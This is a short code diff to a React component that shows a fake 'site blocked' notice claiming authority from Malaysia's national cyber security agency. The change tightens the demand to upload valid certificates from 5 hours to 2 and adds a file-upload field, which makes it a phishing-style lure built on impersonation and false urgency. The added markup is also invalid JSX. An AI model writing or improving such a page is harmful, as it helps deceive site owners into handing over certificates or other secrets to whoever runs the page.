@@ -9,7 +9,11 @@ function block() {
       <div className="notify">NOTIFICATION</div>
       <div className="note">This website is not available in Malaysia as it violate(s) the National Law(s).</div>
       <div className="note1">Untuk maklumat tanjut / for more information <span className="link"><a href="https://www.nacsa.gov.my/legal.php">Click here</a></span>.</div>
-      <div className="error"><span className="action">Action required:</span> You site has been blocked due to invalid certifications. we request you to upload a valid certificates within 5 hours to prevent permanent Domain and Host blockage.</div>
+      <div className="error"><span className="action">Action required:</span> You site has been blocked due to invalid certifications. we request you to upload a valid certificates within 2 hours to prevent permanent Domain and Host blockage.</div>
+      <div class="mb-3">
+        <label for="formFile" class="form-label">Default file input example</label>
+        <input class="form-control" type="file" id="formFile">
+      </div>
     </div>
     </>
   )
